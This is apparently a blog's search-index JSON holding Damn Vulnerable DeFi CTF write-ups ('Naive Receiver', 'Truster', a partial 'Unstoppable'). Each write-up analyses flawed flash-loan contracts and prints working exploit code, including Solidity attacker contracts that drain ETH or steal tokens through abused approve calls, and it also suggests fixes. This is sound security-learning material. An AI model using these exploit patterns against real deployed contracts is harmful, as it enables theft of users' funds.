{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Introduction Hi there! I'm a person interested in information security, currently working as Security Researcher at Onapsis. I'm also fan of CTF's, specially when challenges about crypto and reversing are present. This is the way I found to share the little things I do in my spare time, such as tools, CTF write ups, researches, etc.i Hope you enjoy it! @lmkalg","title":"Home"},{"location":"#introduction","text":"Hi there! I'm a person interested in information security, currently working as Security Researcher at Onapsis. I'm also fan of CTF's, specially when challenges about crypto and reversing are present. This is the way I found to share the little things I do in my spare time, such as tools, CTF write ups, researches, etc.i Hope you enjoy it! @lmkalg","title":"Introduction"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/","text":"Naive Receiver Statement There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH. Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;) Analysis To be honest, I lost quite a lot of time trying to find the bug in order to drain all the ETH from the FlashLoans' contract. After re-reading the challenge statement, I went to my blackboard and wrote 100 times: Understanding contracts Our main goal for this challenge is to drain all the ETH from the User's contract . There are two contracts: NaiveReceiverLenderPool.sol : Contract which implements the logic of the lending pool. FlashLoanReceiver.sol : Contract which implements the logic of receiving funds from the lending pool. Let's first analyze the lending pool contract: It has three different functions: fixedFee : Which returns the value of the private constant (and expensive) fee. receive : Just to be able to receive eth in this Smart Contract. flashLoan : Function that implements the lending logic. function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { 1. uint256 balanceBefore = address(this).balance; 2. require(balanceBefore >= borrowAmount, \"Not enough ETH in pool\"); 3. 4. 5. require(borrower.isContract(), \"Borrower must be a deployed contract\"); 6. // Transfer ETH and handle control to receiver 7. borrower.functionCallWithValue( 8. abi.encodeWithSignature( 9. \"receiveEther(uint256)\", 10. FIXED_FEE 11. ), 12. borrowAmount 13. ); 14. 15. require( 16. address(this).balance >= balanceBefore + FIXED_FEE, 17. \"Flash loan hasn't been paid back\" 18. ); Some notes about this code: It has the 1nonReentrant modifier. So, no reentrancy possible. In the first two lines, it basically checks that the borrowed amount provided as a parameter, doesn't exceed the amount of eth the lending pool has. If it does exceed, it reverts. The 5th \"ensures\" that the borrower address provided as parameter, is a contract address and not an EOA. However, the implementation of isContract() basically checks that codeSize of the provided address is not empty. This action could occur because of several reasons. For more info check this Secureum blog key #159 .... Idea (spoiler): There is no check that the borrower was actually the one sending the message? Lines 7-13 implements the external call to the borrower. It calls the receiveEther() function that should be implemented within the borrower's Smart Contract. It basically gives the control to the borrower in order to do whatever they want with the money. It ensures that the loan was returned by checking the current balance (plus fee). Let's know see what logic is implemented in the use user's contract..It has three different functions: _executeActionDuringFlashLoan : Which is there as a placeholder for all the logic that the user would want to do once they got the money. receive : Just to be able to receive eth in this Smart Contract. receiveEther : Which is in charge of receiving the money from the flashloan 1. function receiveEther(uint256 fee) public payable { 2. require(msg.sender == pool, \"Sender must be pool\"); 3. 4. uint256 amountToBeRepaid = msg.value + fee; 5. 6. require(address(this).balance >= amountToBeRepaid, \"Cannot borrow that much\"); 7. 8. _executeActionDuringFlashLoan(); 9. 10. // Return funds to pool 11. pool.sendValue(amountToBeRepaid); 12. } Some notes about this code: It doesn't have a reentrant modifier.. will this help us? The 2nd line ensures that the one actually sending the money (loan) is the lending pool. 4th and 6th basically checks that the user is able to borrow that amount of money. 8th is the placeholder to implement the logic. 11th returns the loan. Final solution From my POV, the most interesting thing was the use of isContract() inside flashLoan() . This was the moment when I realised that the smart contract wasn't checking if the entity who sent the message to it was the borrower or anyone else. Meaning that anyone, even from an EOA, could use the FlashLoanReceiver's address as borrower. If this happens, every call to flashloan() will mean that, at least, you're draining 1 ETH from the user's contract (the fee). There is even no check to ensure that the borrowed amount is greater than 0, meaning that an attacker can call this function 10 times and drain all 10 ETH from the user's contract. Exploit The final exploit to solve this challenge could be: it('Exploit', async function () { for (let i = 0; i < 10; i++){ await this.pool.flashLoan(this.receiver.address, 0); } }); Fix As part of my learning phase of Smart Contracts Security, I like to think which code changes could be carried out in order to be protected against this issue. I'd add to the lending Smart Contract: A line to ensure that the message sender is the borrower. require(msg.sender == borrower, \"Message sender is not the borrower\"); A line to ensure that empty flashloans are not possible (in order to protect the users of the protocol) require(borrowAmount > 0, \"Empty flashloans are not allowed); Extra From the challenge's statement: [..] Doing it in a single transaction is a big plus ;) The key concept here is the difference between a transaction and a message. Transactions are always issued by EOA's. With this idea in mind, what we could do is develop a Smart Contract that would do the job (loop) for us and call 10 times the flashloan() function from the pool. To minimize the amount of transaction (just one) we have to execute the \"exploit payload\" in the constructor. I developed the following SC and stored it inside contracts/attacker-contracts : /// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; contract NaiveReceiverExploiter { constructor(address pool, address user) { for (int i=0; i < 10; i++){ (bool success, bytes memory data) = pool.call( abi.encodeWithSignature( \"flashLoan(address,uint256)\", user, 0 ) ); require(success, \"Call failed!\"); } } receive () external payable {} } Sorry for my poor Solidity skills, still working on that Then, I modified the naive-receiver.challenge.js with: it('Exploit', async function () { const ExploiterFactory = await ethers.getContractFactory(\"NaiveReceiverExploiter\"); this.exploiter = await ExploiterFactory.deploy(this.pool.address, this.receiver.address); }); And that was all :)","title":"Naive Receiver"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#naive-receiver","text":"","title":"Naive Receiver"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#statement","text":"There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH. Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)","title":"Statement"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#analysis","text":"To be honest, I lost quite a lot of time trying to find the bug in order to drain all the ETH from the FlashLoans' contract. After re-reading the challenge statement, I went to my blackboard and wrote 100 times:","title":"Analysis"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#understanding-contracts","text":"Our main goal for this challenge is to drain all the ETH from the User's contract . There are two contracts: NaiveReceiverLenderPool.sol : Contract which implements the logic of the lending pool. FlashLoanReceiver.sol : Contract which implements the logic of receiving funds from the lending pool. Let's first analyze the lending pool contract: It has three different functions: fixedFee : Which returns the value of the private constant (and expensive) fee. receive : Just to be able to receive eth in this Smart Contract. flashLoan : Function that implements the lending logic. function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { 1. uint256 balanceBefore = address(this).balance; 2. require(balanceBefore >= borrowAmount, \"Not enough ETH in pool\"); 3. 4. 5. require(borrower.isContract(), \"Borrower must be a deployed contract\"); 6. // Transfer ETH and handle control to receiver 7. borrower.functionCallWithValue( 8. abi.encodeWithSignature( 9. \"receiveEther(uint256)\", 10. FIXED_FEE 11. ), 12. borrowAmount 13. ); 14. 15. require( 16. address(this).balance >= balanceBefore + FIXED_FEE, 17. \"Flash loan hasn't been paid back\" 18. ); Some notes about this code: It has the 1nonReentrant modifier. So, no reentrancy possible. In the first two lines, it basically checks that the borrowed amount provided as a parameter, doesn't exceed the amount of eth the lending pool has. If it does exceed, it reverts. The 5th \"ensures\" that the borrower address provided as parameter, is a contract address and not an EOA. However, the implementation of isContract() basically checks that codeSize of the provided address is not empty. This action could occur because of several reasons. For more info check this Secureum blog key #159 .... Idea (spoiler): There is no check that the borrower was actually the one sending the message? Lines 7-13 implements the external call to the borrower. It calls the receiveEther() function that should be implemented within the borrower's Smart Contract. It basically gives the control to the borrower in order to do whatever they want with the money. It ensures that the loan was returned by checking the current balance (plus fee). Let's know see what logic is implemented in the use user's contract..It has three different functions: _executeActionDuringFlashLoan : Which is there as a placeholder for all the logic that the user would want to do once they got the money. receive : Just to be able to receive eth in this Smart Contract. receiveEther : Which is in charge of receiving the money from the flashloan 1. function receiveEther(uint256 fee) public payable { 2. require(msg.sender == pool, \"Sender must be pool\"); 3. 4. uint256 amountToBeRepaid = msg.value + fee; 5. 6. require(address(this).balance >= amountToBeRepaid, \"Cannot borrow that much\"); 7. 8. _executeActionDuringFlashLoan(); 9. 10. // Return funds to pool 11. pool.sendValue(amountToBeRepaid); 12. } Some notes about this code: It doesn't have a reentrant modifier.. will this help us? The 2nd line ensures that the one actually sending the money (loan) is the lending pool. 4th and 6th basically checks that the user is able to borrow that amount of money. 8th is the placeholder to implement the logic. 11th returns the loan.","title":"Understanding contracts"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#final-solution","text":"From my POV, the most interesting thing was the use of isContract() inside flashLoan() . This was the moment when I realised that the smart contract wasn't checking if the entity who sent the message to it was the borrower or anyone else. Meaning that anyone, even from an EOA, could use the FlashLoanReceiver's address as borrower. If this happens, every call to flashloan() will mean that, at least, you're draining 1 ETH from the user's contract (the fee). There is even no check to ensure that the borrowed amount is greater than 0, meaning that an attacker can call this function 10 times and drain all 10 ETH from the user's contract.","title":"Final solution"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#exploit","text":"The final exploit to solve this challenge could be: it('Exploit', async function () { for (let i = 0; i < 10; i++){ await this.pool.flashLoan(this.receiver.address, 0); } });","title":"Exploit"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#fix","text":"As part of my learning phase of Smart Contracts Security, I like to think which code changes could be carried out in order to be protected against this issue. I'd add to the lending Smart Contract: A line to ensure that the message sender is the borrower. require(msg.sender == borrower, \"Message sender is not the borrower\"); A line to ensure that empty flashloans are not possible (in order to protect the users of the protocol) require(borrowAmount > 0, \"Empty flashloans are not allowed);","title":"Fix"},{"location":"DeFi/damn-vulnerable-defi/naive_receiver/#extra","text":"From the challenge's statement: [..] Doing it in a single transaction is a big plus ;) The key concept here is the difference between a transaction and a message. Transactions are always issued by EOA's. With this idea in mind, what we could do is develop a Smart Contract that would do the job (loop) for us and call 10 times the flashloan() function from the pool. To minimize the amount of transaction (just one) we have to execute the \"exploit payload\" in the constructor. I developed the following SC and stored it inside contracts/attacker-contracts : /// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; contract NaiveReceiverExploiter { constructor(address pool, address user) { for (int i=0; i < 10; i++){ (bool success, bytes memory data) = pool.call( abi.encodeWithSignature( \"flashLoan(address,uint256)\", user, 0 ) ); require(success, \"Call failed!\"); } } receive () external payable {} } Sorry for my poor Solidity skills, still working on that Then, I modified the naive-receiver.challenge.js with: it('Exploit', async function () { const ExploiterFactory = await ethers.getContractFactory(\"NaiveReceiverExploiter\"); this.exploiter = await ExploiterFactory.deploy(this.pool.address, this.receiver.address); }); And that was all :)","title":"Extra"},{"location":"DeFi/damn-vulnerable-defi/truster/","text":"Truster Statement More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don't worry, you might be able to take them all from the pool. In a single transaction. Analysis We need to steal all the DVT from the pool and send them to the attacker's address. Understanding contracts There is only one contract to analyze: TrusterLenderPool.sol : Contract which implements the logic of lending flash loans. It has only one interesting function: flashLoan : Function that implements the lending logic. 1. function flashLoan( 2. uint256 borrowAmount, 3. address borrower, 4. address target, 5. bytes calldata data 6. ) 7. external 8. nonReentrant 9. { 10 uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 11. require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\"); 12. 13. damnValuableToken.transfer(borrower, borrowAmount); 14. target.functionCall(data); 15. 16. uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); 17. require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\"); 18. } Some comments about this function: It has the nonReentrant modifier, thus is not possible to attack it with Reentrancy. Lines 10 and 11 ensures that the current DVT pool balance is enough to borrow the asked amount. Otherwise it reverts. Line 13th lends the borrowed money to the borrower. This is quite interesting. It calls a function (which function will depend on the data provided) from the \" target \" Smart Contract. The interesting thing here is that the caller uses both the target value and the data. In simple words, it fully controls the function of which Smart Contract is going to be called. Lines 16 and 17 ensure that the borrower paid back the loan. So moving directly towards the interesting part: How can an attacker leverage the possibility of this arbitrary call? If we want to extract all the money from the pool, we should somehow be able to \"bypass\" the last check. Right? ...Sure? Well, not really. That check is actually not bypassable (as to my knowledge). Instead, we should do something that accomplishes the requirements ensured in line 16 and 17, but still allows us to steal the money. I loved this challenge because it involved a bit more knowledge about the ERC20 standard. I'm not totally sure this is the real reason, but from my POV, because of how DeFi works (Uniswap/Pancakeswap routers) there was a need to implement some concept that would allow an extra entity to spend your money on your behalf. Despite the fact that, at first it could sound a bit weird, this concept is deeply used and very probably you already made use of it and you didn't know. ERC20 standard, allows you to provide Allowance to spend your money by another entity. For example, I could state that I want Pancakeswap to have the allowance to spend my $LUNA tokens. This is what usually happens when using the DEX's Router. In order to do so, ERC20 exposes a function call approve . This function, receives the spender address and the amount which this spender is able to spend. As a side note, I don't recall the version, but at some point OZ included increaseAllowance() and decreaseAllowance() functions instead of approve() in order to tackle a dangerous race condition. If you wanted to decrease the approved amount to your spender, you could end up giving them even a bigger amount to spend. I think that the first answer in this forum explains it in a really short and easy way. Anyways, I just mentioned this because I read about it a couple of months ago, but it is not important for the sake of solving this challenge. Going back to the allowance concept, what we could do is force the Truster Lender Pool to call the ERC20 (damn vulnerable token) contract and execute the approve() function and thus adding our address (or any other address that we want) the power to spend all their tokens. This won't modify the balance of DVT tokens the Trust Lender Pool has, and therefore the checks to ensure that the loan was repaid won't fail. Furthermore, there is no check for asking for a loan of 0 tokens, so we don't have to deal with that problem. In fact, I'm not completely sure about this, but I think this is a KEY part of the solution, because otherwise I'm not sure how we would have managed the part of returning the money. We would have had to do the arbitrary call to some controlled Smart Contract and therefore loose the power of calling a non-controlled one (like the DVT Contract in this case) with the Truster Lender Pool as msg.sender . Enough with ideas, let's move forward to the solution.. Final solution Raw Solution My Javascript developing skills are really bad. My Solidity ones too. However, I invested a lot of time during 2021 understanding how ethereum worked, creating bots and blah, and therefore I knew how a transaction should be crafted. The first exploit I crafted to solve this challenge didn't make use of almost any HardHat feature but just got fun playing with bytes: it('Exploit', async function () { /** CODE YOUR EXPLOIT HERE */ function_arity = \"approve(address,uint256)\"; func_selector = Web3Utils.keccak256(function_arity).slice(0,10); spender = attacker.address.slice(2).padStart(64, '0'); // Remove 0x amount_to_approve = BigInt(TOKENS_IN_POOL).toString(16).padStart(64,'0'); data = func_selector + spender + amount_to_approve; // Debug console.log(\"Function Selector: \" + func_selector); console.log(\"Spender: \" + spender); console.log(\"Amount to approve: \" + amount_to_approve); console.log(\"Data to send: \" + data); // Check allowance before allowance_before = await this.token.allowance(this.pool.address, attacker.address); console.log(\"Allowance: \" + allowance_before) await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data); // Check allowance after allowance_after = await this.token.allowance(this.pool.address, attacker.address); console.log(\"Allowance: \" + allowance_after) await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL); }); The data object that we need to send is basically the payload that the DVT token Smart Contract will receive. Every time you execute a transaction against a Smart Contract where you call a function, you should provide inside the input field, the information of which function you're actually executing. This information is usually encoded. How? First, you must provide the Function Selector (not going to explain this but is simply a way to identify functions inside a Smart Contract). The function select is the first 4 bytes of the keccak256 hash of the function arity. You can find the function arity inside the ABI of the Contract. Following the function selector, all the parameters in hex padded to 64 bytes should be placed. Due to dealing with the approve() function that has two parameters (an address: the spender and a uint256: the amount), we needed to \"encode\" them and add this to our payload. Furthermore, it's important to recall the amount of decimals that the amount must have. This totally depends on the token. Usually it is 18 decimals but in some weird cases I came across tokens with 9 decimals. I could have extracted this from the DVT token contract itself, but it was faster to just hardcode the use of 18 decimals. Once we have all that information together, we are ready to go. Just for the sake of clarity I added some logging to see the if the allowance increased after calling the flashLoan function. This call will ask for 0 tokens as loan, and will provide the attacker address (future spender), the token address (Smart Contract to be called inside the functionCall ) and finally the data (payload of approve() function) that we want to execute. Once this call is finished, nothing will happen in terms of balances (the pool will still have their tokens and the attacker will still have 0 tokens). However, the attacker will be authorized to spend all the money from the Truster Lender Pool. So it's a matter of a executing a transferFrom from the attacker wallet, and sending all the funds to its own wallet. Fancy and Tidy solution A fancier, tidier and better solution is just executing the same thing from a Smart Contract. This allows the attacker to just execute one transaction and also to avoid them calculating the function selector, decimals, and blah (things that I like :P). I developed the following Smart Contract (yeah.. my Solidity developing skills also suck) 1. // SPDX-License-Identifier: MIT 2. pragma solidity ^0.8.0; 3. import \"@openzeppelin/contracts/access/Ownable.sol\"; 4. import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 5. 6. interface ITrusterLenderPool { 7. function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external; 8. function damnValuableToken() external returns (IERC20); 9. } 10 11. contract AttackerTruster is Ownable { 12. 13. constructor (address pool_address, address attacker_address){ 14. pool = ITrusterLenderPool(pool_address); 15. damn_token = IERC20(pool.damnValuableToken()); 16. 17. uint256 tokens_to_steal = damn_token.balanceOf(pool_address); 18. bytes memory data = abi.encodeWithSignature(\"approve(address,uint256)\", address(this), tokens_to_steal); 19. 20 pool.flashLoan(0, address(this), address(damn_token), data); 21 22 bool success = damn_token.transferFrom(pool_address, attacker_address, tokens_to_steal); 23 require(success, \"Something failed while trying to send the tokens to the attacker address\"); 24 } 25 } In order to develop this solution I read a bit more about how to use the ABI interface, how to cast Interfaces in order to call their functions in a tidy way, etc. Lines 14 and 15 just wrap the addresses of the pool and DVT token into their Interfaces objects. The 17 line gets the current DVT balance of the pool address. Line 18th performs all the encoding process explained in the previous chapter ( approve() payload) (much easier, right? meehhhh). Line 20th executes the call to the flashLoan() function, this is where the magic happens. After executing it, this contract will be able to spend all the DVT tokens of the Truster Lender Pool. Finally, line 22 executes the transferFrom() function, sending all the money to the attacker's address. In order to solve it, I stored the previous Smart Contract inside an \"attackers-contracts\" directory within the \"contracts\" directory and completed the following line inside truster.challenge.js : it('Exploit', async function () { const AttackerTruster = await ethers.getContractFactory('AttackerTruster', attacker); await AttackerTruster.deploy(this.pool.address, attacker.address); }); Fix As part of my learning phase of Smart Contracts Security, I like to think how I could solve this issue. I would have done two things: Check that the borrowed amount is greater than 0. I'm not sure if I would lose some kind of feature here, but I would have restricted the call to the msg.sender() and not to a open, independent and arbitrary target .","title":"Truster"},{"location":"DeFi/damn-vulnerable-defi/truster/#truster","text":"","title":"Truster"},{"location":"DeFi/damn-vulnerable-defi/truster/#statement","text":"More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don't worry, you might be able to take them all from the pool. In a single transaction.","title":"Statement"},{"location":"DeFi/damn-vulnerable-defi/truster/#analysis","text":"We need to steal all the DVT from the pool and send them to the attacker's address.","title":"Analysis"},{"location":"DeFi/damn-vulnerable-defi/truster/#understanding-contracts","text":"There is only one contract to analyze: TrusterLenderPool.sol : Contract which implements the logic of lending flash loans. It has only one interesting function: flashLoan : Function that implements the lending logic. 1. function flashLoan( 2. uint256 borrowAmount, 3. address borrower, 4. address target, 5. bytes calldata data 6. ) 7. external 8. nonReentrant 9. { 10 uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 11. require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\"); 12. 13. damnValuableToken.transfer(borrower, borrowAmount); 14. target.functionCall(data); 15. 16. uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); 17. require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\"); 18. } Some comments about this function: It has the nonReentrant modifier, thus is not possible to attack it with Reentrancy. Lines 10 and 11 ensures that the current DVT pool balance is enough to borrow the asked amount. Otherwise it reverts. Line 13th lends the borrowed money to the borrower. This is quite interesting. It calls a function (which function will depend on the data provided) from the \" target \" Smart Contract. The interesting thing here is that the caller uses both the target value and the data. In simple words, it fully controls the function of which Smart Contract is going to be called. Lines 16 and 17 ensure that the borrower paid back the loan. So moving directly towards the interesting part: How can an attacker leverage the possibility of this arbitrary call? If we want to extract all the money from the pool, we should somehow be able to \"bypass\" the last check. Right? ...Sure? Well, not really. That check is actually not bypassable (as to my knowledge). Instead, we should do something that accomplishes the requirements ensured in line 16 and 17, but still allows us to steal the money. I loved this challenge because it involved a bit more knowledge about the ERC20 standard. I'm not totally sure this is the real reason, but from my POV, because of how DeFi works (Uniswap/Pancakeswap routers) there was a need to implement some concept that would allow an extra entity to spend your money on your behalf. Despite the fact that, at first it could sound a bit weird, this concept is deeply used and very probably you already made use of it and you didn't know. ERC20 standard, allows you to provide Allowance to spend your money by another entity. For example, I could state that I want Pancakeswap to have the allowance to spend my $LUNA tokens. This is what usually happens when using the DEX's Router. In order to do so, ERC20 exposes a function call approve . This function, receives the spender address and the amount which this spender is able to spend. As a side note, I don't recall the version, but at some point OZ included increaseAllowance() and decreaseAllowance() functions instead of approve() in order to tackle a dangerous race condition. If you wanted to decrease the approved amount to your spender, you could end up giving them even a bigger amount to spend. I think that the first answer in this forum explains it in a really short and easy way. Anyways, I just mentioned this because I read about it a couple of months ago, but it is not important for the sake of solving this challenge. Going back to the allowance concept, what we could do is force the Truster Lender Pool to call the ERC20 (damn vulnerable token) contract and execute the approve() function and thus adding our address (or any other address that we want) the power to spend all their tokens. This won't modify the balance of DVT tokens the Trust Lender Pool has, and therefore the checks to ensure that the loan was repaid won't fail. Furthermore, there is no check for asking for a loan of 0 tokens, so we don't have to deal with that problem. In fact, I'm not completely sure about this, but I think this is a KEY part of the solution, because otherwise I'm not sure how we would have managed the part of returning the money. We would have had to do the arbitrary call to some controlled Smart Contract and therefore loose the power of calling a non-controlled one (like the DVT Contract in this case) with the Truster Lender Pool as msg.sender . Enough with ideas, let's move forward to the solution..","title":"Understanding contracts"},{"location":"DeFi/damn-vulnerable-defi/truster/#final-solution","text":"","title":"Final solution"},{"location":"DeFi/damn-vulnerable-defi/truster/#raw-solution","text":"My Javascript developing skills are really bad. My Solidity ones too. However, I invested a lot of time during 2021 understanding how ethereum worked, creating bots and blah, and therefore I knew how a transaction should be crafted. The first exploit I crafted to solve this challenge didn't make use of almost any HardHat feature but just got fun playing with bytes: it('Exploit', async function () { /** CODE YOUR EXPLOIT HERE */ function_arity = \"approve(address,uint256)\"; func_selector = Web3Utils.keccak256(function_arity).slice(0,10); spender = attacker.address.slice(2).padStart(64, '0'); // Remove 0x amount_to_approve = BigInt(TOKENS_IN_POOL).toString(16).padStart(64,'0'); data = func_selector + spender + amount_to_approve; // Debug console.log(\"Function Selector: \" + func_selector); console.log(\"Spender: \" + spender); console.log(\"Amount to approve: \" + amount_to_approve); console.log(\"Data to send: \" + data); // Check allowance before allowance_before = await this.token.allowance(this.pool.address, attacker.address); console.log(\"Allowance: \" + allowance_before) await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data); // Check allowance after allowance_after = await this.token.allowance(this.pool.address, attacker.address); console.log(\"Allowance: \" + allowance_after) await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL); }); The data object that we need to send is basically the payload that the DVT token Smart Contract will receive. Every time you execute a transaction against a Smart Contract where you call a function, you should provide inside the input field, the information of which function you're actually executing. This information is usually encoded. How? First, you must provide the Function Selector (not going to explain this but is simply a way to identify functions inside a Smart Contract). The function select is the first 4 bytes of the keccak256 hash of the function arity. You can find the function arity inside the ABI of the Contract. Following the function selector, all the parameters in hex padded to 64 bytes should be placed. Due to dealing with the approve() function that has two parameters (an address: the spender and a uint256: the amount), we needed to \"encode\" them and add this to our payload. Furthermore, it's important to recall the amount of decimals that the amount must have. This totally depends on the token. Usually it is 18 decimals but in some weird cases I came across tokens with 9 decimals. I could have extracted this from the DVT token contract itself, but it was faster to just hardcode the use of 18 decimals. Once we have all that information together, we are ready to go. Just for the sake of clarity I added some logging to see the if the allowance increased after calling the flashLoan function. This call will ask for 0 tokens as loan, and will provide the attacker address (future spender), the token address (Smart Contract to be called inside the functionCall ) and finally the data (payload of approve() function) that we want to execute. Once this call is finished, nothing will happen in terms of balances (the pool will still have their tokens and the attacker will still have 0 tokens). However, the attacker will be authorized to spend all the money from the Truster Lender Pool. So it's a matter of a executing a transferFrom from the attacker wallet, and sending all the funds to its own wallet.","title":"Raw Solution"},{"location":"DeFi/damn-vulnerable-defi/truster/#fancy-and-tidy-solution","text":"A fancier, tidier and better solution is just executing the same thing from a Smart Contract. This allows the attacker to just execute one transaction and also to avoid them calculating the function selector, decimals, and blah (things that I like :P). I developed the following Smart Contract (yeah.. my Solidity developing skills also suck) 1. // SPDX-License-Identifier: MIT 2. pragma solidity ^0.8.0; 3. import \"@openzeppelin/contracts/access/Ownable.sol\"; 4. import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 5. 6. interface ITrusterLenderPool { 7. function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external; 8. function damnValuableToken() external returns (IERC20); 9. } 10 11. contract AttackerTruster is Ownable { 12. 13. constructor (address pool_address, address attacker_address){ 14. pool = ITrusterLenderPool(pool_address); 15. damn_token = IERC20(pool.damnValuableToken()); 16. 17. uint256 tokens_to_steal = damn_token.balanceOf(pool_address); 18. bytes memory data = abi.encodeWithSignature(\"approve(address,uint256)\", address(this), tokens_to_steal); 19. 20 pool.flashLoan(0, address(this), address(damn_token), data); 21 22 bool success = damn_token.transferFrom(pool_address, attacker_address, tokens_to_steal); 23 require(success, \"Something failed while trying to send the tokens to the attacker address\"); 24 } 25 } In order to develop this solution I read a bit more about how to use the ABI interface, how to cast Interfaces in order to call their functions in a tidy way, etc. Lines 14 and 15 just wrap the addresses of the pool and DVT token into their Interfaces objects. The 17 line gets the current DVT balance of the pool address. Line 18th performs all the encoding process explained in the previous chapter ( approve() payload) (much easier, right? meehhhh). Line 20th executes the call to the flashLoan() function, this is where the magic happens. After executing it, this contract will be able to spend all the DVT tokens of the Truster Lender Pool. Finally, line 22 executes the transferFrom() function, sending all the money to the attacker's address. In order to solve it, I stored the previous Smart Contract inside an \"attackers-contracts\" directory within the \"contracts\" directory and completed the following line inside truster.challenge.js : it('Exploit', async function () { const AttackerTruster = await ethers.getContractFactory('AttackerTruster', attacker); await AttackerTruster.deploy(this.pool.address, attacker.address); });","title":"Fancy and Tidy solution"},{"location":"DeFi/damn-vulnerable-defi/truster/#fix","text":"As part of my learning phase of Smart Contracts Security, I like to think how I could solve this issue. I would have done two things: Check that the borrowed amount is greater than 0. I'm not sure if I would lose some kind of feature here, but I would have restricted the call to the msg.sender() and not to a open, independent and arbitrary target .","title":"Fix"},{"location":"DeFi/damn-vulnerable-defi/unstoppable/","text":"Unstoppable Statement There's a lending pool with a million DVT tokens in balance, offering flash loans for free. If only there was a way to attack and stop the pool from offering flash loans ... You start with 100 DVT tokens in balance. Analysis According to the statement our mission is to try to stop the pool for offering flash loans. No need to extract money, empty an account or anything else. Just, freeze the contract. Understanding contracts There are two contracts: UnstoppableLender.sol : Contract which implements the logic of the lending flash loans. ReceiverUnstoppable.sol : Contract which implements the logic of receiving funds from the lending pool. Let's first analyze the lending pool contract: This contract implements a pool of ERC20 tokens (damnValuableToken). In fact, the address of the underlying token is provided in the constructor. It has two interesting functions: depositTokens : Function that implements the deposit of tokens into the pool. Updating some internal variables. flashLoan : Function that implements the lending logic. 1. function depositTokens(uint256 amount) external nonReentrant { 2. require(amount > 0, \"Must deposit at least one token\"); 3. // Transfer token from sender. Sender must have first approved them. 4. damnValuableToken.transferFrom(msg.sender, address(this), amount); 5. poolBalance = poolBalance + amount; 6. } Some comments about this function: It first checks that the amount of damnValuableToken (ERC20 token) to be deposited is greater than 0. It performs a transfer from the address calling this function (the wallet doing the deposit) to the current pool. In order to be able to execute such functionality, the wallet should've already provided with permissions to do that (allowance) It stores and updates an internal variable poolBalance which holds the current amount of tokens that the pool has. Now, let's move on to the following function: 0. function flashLoan(uint256 borrowAmount) external nonReentrant { 1. require(borrowAmount > 0, \"Must borrow at least one token\"); 2. 3. uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 4. require(balanceBefore >= borrowAmount, \"Not enough tokens in pool\"); 5. 6. // Ensured by the protocol via the `depositTokens` function 7. assert(poolBalance == balanceBefore); 8. 9. damnValuableToken.transfer(msg.sender, borrowAmount); 10. 11. IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount); 12. 13. uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); 14. require(balanceAfter >= balanceBefore, \"Flash loan hasn't been paid back\"); 18. } Some notes about this code snippet: It has the nonReentrant modifier. So, no reentrancy possible. In the first three lines, it basically checks that the borrowed amount provided as a parameter is valid. In order to do so, it checks if it\u2019s greater than zero and that it doesn't exceed the amount of tokens the lending pool has. If it does exceed, it reverts. The 7th line is a bit controversial and weird. It checks that the amount of damnValuableTokens that the pool currently has is the same as the internal variable that is updated in the depositTokens() function. Why is this carried out? Why would someone try to store the actual balance if this information is already stored in the ERC20 token contract? Remember that calls to that function are free because they are reading the blockchain and not writing anything. Line 11 calls the receiveToken() function from the ReceiverUnstoppable contract. This is where the borrower would implement the logic to leverage the loan received. Line 13-14 basically ensures that the loan has been repaid (with fees). Final solution According to the exercise statement we had to find a way to stop the pool offering loans. Line 7th seems very controversial as it is comparing two values that should be always the same but they are managed in different ways. If it was only possible to change one of them in order to desync them... Well.. in fact it is actually possible. The depositTokens() is adding the deposited value to the internal value each time this function is called. On the other side, the ERC20 balanceOf() function, checks the amount of tokens that the address has according to the ERC20 contract. So.. is the depositTokens() the only way to deposit/send damnValuableToken tokens in this pool? Clearly, no. What somebody could do is just to send 1 damnValuableToken to this pool address and this will make \"update\" the balance of the pool's damnValuableTokens but the poolBalance will remain the same. By desyncing these two variables, line 7th will always fail and therefore this function will always 